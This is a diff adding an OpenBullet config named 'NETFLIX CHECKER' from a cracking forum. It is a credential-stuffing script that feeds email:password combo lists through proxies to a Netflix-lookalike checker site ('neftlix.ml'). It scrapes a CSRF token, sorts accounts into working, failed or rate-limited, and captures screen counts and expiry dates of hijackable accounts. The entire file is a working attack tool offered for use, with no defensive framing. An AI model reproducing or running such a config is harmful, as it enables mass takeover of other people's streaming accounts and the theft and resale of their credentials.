@@ -1,0 +1,70 @@
+[SETTINGS]
+{
+  "Name": "NETFLIX CHECKER",
+  "SuggestedBots": 50,
+  "LastModified": "2019-06-07T06:39:59.8430692+08:00",
+  "AdditionalInfo": "",
+  "KeysDB": "OB-64bac1eb025a2fa7540633af40d092cd-LoliKEY",
+  "LocalKeysDB": "",
+  "isWtoEdit": false,
+  "Author": "CrackingLegend.pw (loliX Encrypted)",
+  "Version": "1.2.1.1",
+  "IgnoreResponseErrors": false,
+  "NeedsProxies": true,
+  "OnlySocks": false,
+  "OnlySsl": false,
+  "MaxProxyUses": 0,
+  "AllowedWordlist1": "MailPass",
+  "AllowedWordlist2": "",
+  "DataRules": [],
+  "CustomInputs": [],
+  "ForceHeadless": false,
+  "AlwaysOpen": false,
+  "AlwaysQuit": false,
+  "DisableNotifications": false,
+  "CustomUserAgent": "",
+  "RandomUA": false,
+  "CustomCMDArgs": ""
+}
+
+[SCRIPT]
+REQUEST GET "https://checker.neftlix.ml/" 
+  
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+
+#ENCODE FUNCTION URLEncode "<USER>:<PASS>" -> VAR "USERPASS" 
+
+#TOKEN PARSE "<SOURCE>" LR "name=\"_token\" type=\"hidden\" value=\"" "\"" -> VAR "TOKEN" 
+
+#LOGIN REQUEST POST "https://checker.neftlix.ml/check-account" 
+  CONTENT "account=<USERPASS>" 
+  CONTENTTYPE "application/x-www-form-urlencoded; charset=UTF-8" 
+  HEADER "User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Gecko" 
+  HEADER "Pragma: no-cache" 
+  HEADER "Accept: */*" 
+  HEADER "accept: application/json, text/javascript, */*; q=0.01" 
+  HEADER "origin: https://checker.neftlix.ml" 
+  HEADER "x-csrf-token: <TOKEN>" 
+  HEADER "x-requested-with: XMLHttpRequest" 
+  HEADER "user-agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36" 
+  HEADER "referer: https://checker.neftlix.ml/" 
+  HEADER "accept-language: en-US,en;q=0.9" 
+
+KEYCHECK 
+  KEYCHAIN Failure AND 
+    KEY "working\":false" 
+    KEY "<SOURCE>" DoesNotContain "FREE limit raised" 
+  KEYCHAIN Success OR 
+    KEY "working\":true" 
+  KEYCHAIN Ban AND 
+    KEY "working\":false" 
+    KEY "FREE limit raised" 
+
+#Screens PARSE "<SOURCE>" LR "\"screens\":" "," -> CAP "Screens" 
+
+#Expiry PARSE "<SOURCE>" LR "\"until\":\"" "\"" -> CAP "Expiry" "" "  >>>Visit us @crackinglegend.pw" 
+
+
